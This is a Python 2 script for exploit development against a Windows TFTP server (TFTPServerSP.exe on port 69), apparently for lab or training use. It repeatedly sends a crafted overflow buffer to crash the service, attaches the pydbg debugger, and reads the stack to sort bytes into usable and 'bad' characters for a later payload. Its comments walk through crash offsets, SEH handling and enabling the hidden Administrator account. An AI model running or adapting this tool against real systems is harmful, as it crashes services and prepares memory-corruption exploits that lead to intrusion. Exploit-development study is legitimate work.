#!/usr/bin/env python

# Description: Identify good and bad chars. TCP based overflow

# Script requirements: python 2.7 x86, pydbg 32bit binary, python wmi, pywin32
# install python-2.7.9.msi (with pip)
# pip install pydbg-1.2-cp27-none-win32.whl
# install WMI-1.4.9.win32.exe
# install pywin32-218.win32-py2.7.exe 
# note: if at the end issue to import pydbg, try to redo pip install pydbg-1.2-cp27-none-win32.whl)
# or:
# Copy pydbg inside C:\Python27\Lib\site-packages\
# Copy pydasm.pyd inside C:\Python27\Lib\site-packages\pydbg\

# How to use:
# 0 - If program is a service, login as administrator (if hidden : net user administrator /active:yes) 
# 1 - Crash the program in debugger (if seh, without passing the exception !!)
# 2 - Find a pointer on stack which leads to our buffer (note the offset from ESP)
# 3 - Use pattern_create / pattern_offset to locate where to put the test char in the buffer
# 4 - Choose between TCP and UDP socket: change in crash_service() and is_service_responsive()
# 5 - Choose between return address overwrite or seh overflow: change in _access_violation_handler(dbg)
# 6 - Change variable at the begining of this script:
#   processName
#   machine
#   service
#   listeningPort
#   request_template
#   crashLoad
#   responsive_test_string
#   crash_wait_timeout
#   timeToRestartService
#   esp_offset ()   ==> To change the offset calculation from - to +, change it in _access_violation_handler(dbg) function
#   testCharBufferLen

import os
import socket
import subprocess
import sys
import threading
import time
import wmi
import win32serviceutil

from pydbg import *
from pydbg.defines import *


allchars = (
    "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13"
    "\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26"
    "\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39"
    "\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c"
    "\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
    "\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72"
    "\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85"
    "\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98"
    "\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab"
    "\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe"
    "\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1"
    "\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4"
    "\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7"
    "\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)

# ================================================================================================== #
# CHANGE ME !                                                                                        #
# ================================================================================================== #
request_template = (
    "\x00\x02" + "{}" + "\x00" + "netascii" + "\x00"
)

processName = "TFTPServerSP.exe" # name of the process as it appears in tasklist (look in Processes and not Applications)
machine = 'vis'  # hostname of the machine
service = 'TFTPServer'  # name of the service (Name in service tasklist )
listeningPort = 69 # Port of the listening process
# load to crash the process with {} representing where our test chars will go. This string will then be used to format request_template
crashLoad = "{}" + "A" * 1228 + "\x42\x42\x42\x42" + "C" * (5000 - 1228 - 4 - 4) 
responsive_test_string = "" # valid payload to send to the server to test connection 
crash_wait_timeout = 10 # seconds to wait after a payload has been sent
timeToRestartService = 3 # time to wait before restart service (3 usually good) 
esp_offset = 0xC   # If SEH locate offset before passing exception. [ESP + 0xC] points to our test buffer. To change the offset calculation from - to +, change it in _access_violation_handler(dbg)
testCharBufferLen = 0x04 # How many bytes to inject in payload and compare (adjust crash template accordingly)
# ================================================================================================== #

cur_char = ""    # Current char that is being checked
badchars = []
goodchars = []
evil_str_sent = False
service_is_running = False


def service_running(service, machine):
    return win32serviceutil.QueryServiceStatus(service, machine)[1] == 4


def chars_to_str(chars):
    """Convert a list of chars to a string"""
    result = ""
    for char in chars:
        result += "\\x{:02x}".format(ord(char))
    return result


def crash_service():
    """Send malformed data to the program in order to crash it. Function
    runs in an independent thread"""
    
    global evil_str_sent, cur_char, badchars, goodchars, allchars
    global service_is_running

    char_counter = -1
    timer = 0
    while True:
        if not service_is_running:   # Don't send evil string if process is not running
            time.sleep(2)
            continue

        # If main loop reset the evil_str_sent flag to False, sent evil_str again
        if not evil_str_sent:
            timer = 0
            
            char_counter += 1
            if char_counter > len(allchars)-1:
                print("[+] Bad chars: {}.".format(chars_to_str(badchars)))
                print("[+] Good chars: {}.".format(chars_to_str(goodchars)))
                print("[+] Done.")
                
                os._exit(0) # Hack to exit application from non-main thread

            cur_char = allchars[char_counter]
            crash = crashLoad.format(cur_char * testCharBufferLen)
            evil_str = request_template.format(crash)

            print("[*] Sending evil TCP request...")
            try:
                # ---------------------------------------------------------- #
                # For TCP socket (SOCK_STREAM) :                             #
                #   sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #
                # For UDP socket (SOCK_DGRAM) :                              #
                #   sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  #
                # ---------------------------------------------------------- #
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.connect(("127.0.0.1", listeningPort))
                sock.send(evil_str)
                #sock.close()
            except:
                print("[*] Error sending malicious buffer; service may be down.")
                print("[*] Restarting the service and retrying...")

                service_is_running = False
                subprocess.Popen('taskkill /f /im ' +  processName).communicate()
            finally:
                evil_str_sent = True

        else:
            if timer > crash_wait_timeout:
                print("[*] "+str(crash_wait_timeout)+" seconds passed without a crash. Bad char "
                      "probably prevented the crash.")
                print("[*] Marking last char as bad and killing the service...")

                badchars.append(cur_char)
                print("[*] Bad chars so far: {}.".format(chars_to_str(badchars)))
                with open("badchars.txt",'w') as f:
                    f.write(chars_to_str(badchars))

                service_is_running = False
                subprocess.Popen('taskkill /f /im ' +  processName).communicate()
            
            time.sleep(1)
            timer += 1
    return


def is_service_started():
    """Check if service was successfully started"""
    
    print("[*] Making sure the service was restarted...")
    service_check_counter = 0
    while not service_is_running:
        if service_check_counter > 4: # Give it 5 attempts
            return False
        for process in wmi.WMI().Win32_Process():
            if process.Name == processName:
                return process.ProcessId
        service_check_counter += 1
        time.sleep(1)


def is_service_responsive():
    """Check if service responds to TCP requests"""
    
    print("[*] Making sure the service responds to TCP requests...")
    # return always true (debug to make the function work)
    return True
    service_check_counter = 0
    while not service_is_running:
        if service_check_counter > 4: # Give it 5 attempts
            return False
        try:
            # ---------------------------------------------------------- #
            # For TCP socket (SOCK_STREAM) :                             #
            #   sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #
            # For UDP socket (SOCK_DGRAM) :                              #
            #   sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  #
            # ---------------------------------------------------------- #
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.connect(("127.0.0.1", listeningPort))
            #test_str = responsive_test_string
            #if test_str != '':
            #    sock.send(test_str)
            #sock.settimeout(1) # Give response 1 second to arrive
            resp = sock.recv(1024)
            if resp:
                return True
            sock.close()
        except Exception as e:
            pass

        service_check_counter += 1


def restart_service():
    """Restart program and return its PID"""
    
    global service_is_running
    service_is_running = False

    # Check that the service is running before stopping it
    for process in wmi.WMI().Win32_Process():
        if process.Name == processName:
            print("[*] Stopping the service...")
            # Forcefully terminate the process
            subprocess.Popen('taskkill /f /im ' +  processName).communicate()

    print("[*] Starting the service...")
    time.sleep(timeToRestartService)  # let enough time for the service to stop
    running = service_running(service, machine)
    if not running:
        win32serviceutil.StartService(service, machine)
        #subprocess.Popen(executable)
    else:
        win32serviceutil.RestartService(service, machine)

    pid = is_service_started()
    if pid:
        print("[*] The service was restarted.")
    else:
        print("[-] Service was not found in process list. Restarting...")
        return restart_service()

    if is_service_responsive():
        print("[*] Service responds to TCP requests. Green ligth.")
        service_is_running = True
        return pid
    else:
        print("[-] Service does not respond to TCP requests. Restarting...")
        return restart_service()


def check_char(rawdata):
    """Compare the buffer sent with the one in memory to see if
    it has been mangled in order to identify bad characters."""

    global badchars, goodchars
    
    hexdata = dbg.hex_dump(rawdata)
    print("[*] Buffer: {}".format(hexdata))

    if rawdata == (cur_char * testCharBufferLen):
        goodchars.append(cur_char)
        print("[*] Char {} is good.".format(chars_to_str(cur_char)))
        print("[*] Good chars so far: {}.".format(chars_to_str(goodchars)))
        with open("goodchars.txt",'w') as f:
            f.write(chars_to_str(goodchars))
    else:
        badchars.append(cur_char)
        print("[*] Char {} is bad.".format(chars_to_str(cur_char)))
        print("[*] Bad chars so far: {}.".format(chars_to_str(badchars)))
        with open("badchars.txt",'w') as f:
            f.write(chars_to_str(badchars))
    return


def _access_violation_handler(dbg):
    """On access violation read data from the stack to
    determine if the sent buffer was mangled in any way"""

    print("[*] Access violation caught.")

    # -------------------------------------------------------------------------------------------------------------------- #
    #   If direct retrun address overwrite, test char buffer is accessible on stack (at an offset of ESP):                 #
    #       buf_address = dbg.context.Esp - esp_offset                                                                     #
    #   If seh overflow, test char buffer is referenced by a pointer reachable from an offset of ESP):                     #
    #       buf_address = dbg.read(dbg.context.Esp + esp_offset, 0x4)                                                      #
    #       buf_address = dbg.flip_endian_dword(buf_address)                                                               #
    # -------------------------------------------------------------------------------------------------------------------- #
    buf_address = dbg.read(dbg.context.Esp + esp_offset, 0x4)
    buf_address = dbg.flip_endian_dword(buf_address)
    
    print("[DEBUG] buf_address: {}".format(buf_address))
    if buf_address:
        buffer = dbg.read(buf_address, testCharBufferLen)
    else:
        # Now when the first request sent is the one for checking if the service responds
        # The buf_address sometimes returns 0. This is to handle that case.
        buffer = ""
    
    print("[*] Checking whether the char is good or bad...")
    check_char(buffer)

    dbg.detach()

    return DBG_EXCEPTION_NOT_HANDLED


def debug_process(pid):
    """Create a debugger instance and attach to program PID"""
    
    dbg = pydbg()
    dbg.set_callback(EXCEPTION_ACCESS_VIOLATION, _access_violation_handler)

    while True:
        try:
            print("[*] Attaching debugger to pid: {}.".format(pid))
            if dbg.attach(pid):
                return dbg
            else:
                return False
        except Exception as e:
            print("[*] Error while attaching: {}.".format(e.message))
            return False


if __name__ == '__main__':

    # Create and start crasher thread
    crasher_thread = threading.Thread(target=crash_service)
    crasher_thread.setDaemon(0)
    crasher_thread.start()
    
    # Main loop
    while True:
        pid = restart_service()
        dbg = debug_process(pid)
        if dbg:
            # Tell crasher thread to send malicious input to process
            evil_str_sent = False 
            dbg.run()             # Enter the debugging loop